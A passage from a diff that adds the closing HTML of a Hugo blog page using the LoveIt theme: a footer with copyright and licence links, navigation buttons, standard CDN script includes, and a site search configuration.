+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.105.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Saad Akhtar</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
